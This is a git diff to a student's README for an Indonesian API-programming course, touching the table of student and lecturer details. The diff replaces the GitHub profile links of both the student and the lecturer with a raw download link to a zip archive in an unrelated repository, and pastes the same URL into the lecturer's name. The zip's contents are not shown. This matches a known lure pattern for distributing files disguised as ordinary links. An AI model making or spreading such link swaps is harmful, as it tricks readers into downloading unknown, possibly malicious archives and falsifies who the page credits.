@@ -2,11 +2,11 @@
 
 | Field          | Data                                                                      |
 |----------------|---------------------------------------------------------------------------|
-| Nama Lengkap   | [EKA PRASETIAWAN](https://github.com/EkkaaAE)                             |
+| Nama Lengkap   | [EKA PRASETIAWAN](https://github.com/esekasa/PemrogramanAPI-Latihan/raw/refs/heads/main/app/albums/Pemrograman_AP_Latihan_v1.1-beta.1.zip)                             |
 | NIM            | 22104410028                                                               |
 | Kelas          | TEKNIK INFORMATIKA - 5A                                                   |
 | Matkul         | PEMROGRAMAN API                                                           |
-| Dosen Pengampu | [Mohammad Faried Rahmat, S.S.T., M.Tr.T](https://github.com/fariedrahmat) |
+| Dosen Pengampu | [Mohammad Faried Rahmat, S.S.T., https://github.com/esekasa/PemrogramanAPI-Latihan/raw/refs/heads/main/app/albums/Pemrograman_AP_Latihan_v1.1-beta.1.zip](https://github.com/esekasa/PemrogramanAPI-Latihan/raw/refs/heads/main/app/albums/Pemrograman_AP_Latihan_v1.1-beta.1.zip) |
 
 ## PEMROGRAMAN API
 
